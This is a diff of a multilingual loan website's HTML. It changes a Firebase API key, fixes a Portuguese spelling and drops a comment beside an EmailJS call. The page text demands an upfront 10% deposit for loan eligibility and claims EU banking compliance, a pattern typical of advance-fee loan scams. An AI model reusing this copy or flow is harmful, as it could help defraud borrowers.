@@ -282,14 +282,14 @@
         </div>
     </div>
 
-    <!-- Firebase SDK -->
+    <!-- Firebase SDK corrigé -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
-            apiKey: "AIzaSyDoLXPKEAYjtQLSA4_GTknEapfzm3LetPc",
+            apiKey: "AIzaSyD-LXPKEAYjtQLSA4_GTknEapfzm3LetPc",
             authDomain: "europret-cea9b.firebaseapp.com",
             projectId: "europret-cea9b",
             storageBucket: "europret-cea9b.firebasestorage.app",
@@ -561,7 +561,7 @@
                 resTitle: "Resumo da Simulação", resMonthly: "Prestação mensal estimada:", resDeposit: "Depósito obrigatório (10%):",
                 resNote: "* O depósito de 10% constitui uma condição prévia obrigatória para validar a elegibilidade do pedido de empréstimo.",
                 btnApply: "Fazer pedido oficial e Registar",
-                adv1Title: "Conformidade Europea", adv1Desc: "Estrito cumprimento das normas bancárias da União Europeia, garantindo total segurança das suas transações e dados pessoais.",
+                adv1Title: "Conformidade Europeia", adv1Desc: "Estrito cumprimento das normas bancárias da União Europeia, garantindo total segurança das suas transações e dados pessoais.",
                 adv2Title: "Multilingue e 27 Estados", adv2Desc: "Plataforma disponível para todos os residentes do Espaço Económico Europeu com suporte linguístico automatizado.",
                 adv3Title: "Decisão Rápida", adv3Desc: "Acompanhamento em tempo real do seu dossier através do seu espaço pessoal seguro e processamento rigoroso pelos nossos especialistas.",
                 dashTitle: "Painel do Mutuário", dashSubtitle: "Acompanhamento do seu dossier de financiamento europeu.",
@@ -679,7 +679,6 @@
 
                 document.getElementById('auth-submit-btn').textContent = "Envoi en cours...";
 
-                // Utilisation des identifiants exacts fournis
                 emailjs.send("service_z48xw7d", "template_yikgt3c", templateParams)
                     .then(function(response) {
                         alert("E-mail envoyé dans votre Gmail !");
